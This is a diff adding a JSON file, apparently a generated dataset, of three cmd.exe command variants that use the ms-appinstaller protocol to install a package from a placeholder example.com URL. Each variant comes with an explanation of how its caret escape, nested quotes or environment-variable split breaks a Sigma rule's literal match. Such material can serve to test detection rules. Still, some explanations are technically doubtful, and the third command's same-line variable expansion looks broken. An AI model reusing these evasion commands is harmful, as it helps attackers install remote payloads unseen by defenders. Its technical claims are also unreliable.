@@ -1,0 +1,14 @@
+[
+  {
+    "output": "cmd.exe /c \"start ms-appinstaller://?source^=http://example.com/package.appinstaller\"",
+    "explanation": "Insertion technique: Injects a Windows command shell caret (^) escape character immediately before the equals sign in the protocol string ('source^='). When executed under cmd.exe, the interpreter strips the caret out to normalize the command line for proper system protocol handler invocation. However, the process creation telemetry records the literal caret string, which breaks the required contiguous matching condition for 'ms-appinstaller://?source='."
+  },
+  {
+    "output": "cmd.exe /c \"start ms-appinstaller://?\"source\"=http://example.com/package.appinstaller\"",
+    "explanation": "Insertion technique: Injects nested double quotes around the key parameter ('\"source\"'). The Windows protocol handler sub-engine parses and unwraps quoted strings inside URLs seamlessly to interpret the parameter name correctly. This breaks the contiguous literal text sequence matched by the Sigma rule without disrupting the simulated execution flow."
+  },
+  {
+    "output": "cmd.exe /c \"set PROTOCOL=ms-appinstaller://?source=&& call start %PROTOCOL%http://example.com/package.appinstaller\"",
+    "explanation": "Recoding / Encoding technique: Leverages intermediate environment variable instantiation inside a standard shell context. By breaking the logical payload string across variable evaluation sequences and calling the result dynamically, the target static keyword block 'ms-appinstaller://?source=' is fragmented and obscured within the telemetry logs recorded for the process invocation tracker."
+  }
+]
